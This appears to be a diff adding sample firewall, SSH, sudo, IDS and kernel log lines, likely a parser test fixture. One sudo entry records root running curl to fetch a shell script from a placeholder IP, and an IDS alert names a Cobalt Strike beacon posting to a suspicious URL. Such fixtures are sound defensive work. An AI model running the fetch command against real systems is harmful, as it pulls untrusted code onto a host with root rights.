@@ -1,0 +1,6 @@
+<165>1 2026-10-07T10:50:01.003Z fw-edge-01 sshd 2201 ID47 [origin@32473 ip="10.0.0.1" software="openssh"] Failed password for invalid user deploy from 203.0.113.45 port 60122 ssh2
+<38>Oct  7 10:50:02 web-01 sshd[22901]: Accepted publickey for ubuntu from 198.51.100.7 port 51515 ssh2: ED25519 SHA256:abc
+<85>Oct  7 10:50:03 web-01 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.99/x.sh
+<134>Oct  7 10:50:04 fw-edge-01 CEF:0|Acme Networks|EdgeWall|7.4.1|deny-1001|Blocked inbound connection|5|rt=Oct 07 2026 10:50:04 src=203.0.113.45 spt=60122 dst=10.0.1.15 dpt=3389 proto=TCP act=deny deviceDirection=0 cs1Label=policy cs1=block-rdp-inbound outcome=failure msg=RDP from internet blocked dvchost=fw-edge-01 externalId=evt-98765
+CEF:0|Bloody Labs|SensorX|2.1|ids:2027865|Cobalt Strike beacon detected|9|src=10.0.10.21 dst=198.51.100.23 dpt=443 request=https://cdn-update.badcdn.net/submit.php?id\=42 requestMethod=POST fileHash=8a62e967fcd6dfa5d75308c37808b4668a7faf1cdb06e09ac0a7161827603887 msg=Beacon check-in\nsecond line cat=Malware
+<13>Oct  7 10:50:06 lnx-db-01 kernel: [12345.678] EXT4-fs (sda1): mounted filesystem with ordered data mode
